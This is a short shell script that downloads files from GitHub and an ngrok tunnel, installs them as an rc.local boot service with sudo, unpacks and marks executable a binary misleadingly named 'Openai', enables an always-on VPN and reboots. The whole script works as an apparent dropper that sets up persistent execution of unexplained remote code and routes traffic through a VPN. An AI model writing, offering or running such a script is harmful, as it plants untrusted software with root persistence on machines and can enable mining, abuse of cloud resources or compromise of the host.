#!/bin/sh


wget https://raw.githubusercontent.com/minnie1311/azureAI/master/rc-local.service
sudo mv rc-local.service /etc/systemd/system/rc-local.service
wget https://raw.githubusercontent.com/minnie1311/dang/main/rc.local1
sudo mv rc.local1 /etc/rc.local
sudo chmod +x /etc/rc.local
sudo systemctl enable rc-local
sudo wget http://b529-20-197-103-154.ngrok.io/don.zip
sudo unzip don.zip
sudo chmod +x Openai
sudo wget https://raw.githubusercontent.com/minnie1311/dang/main/autostart.sh
warp-cli enable-always-on
sudo reboot



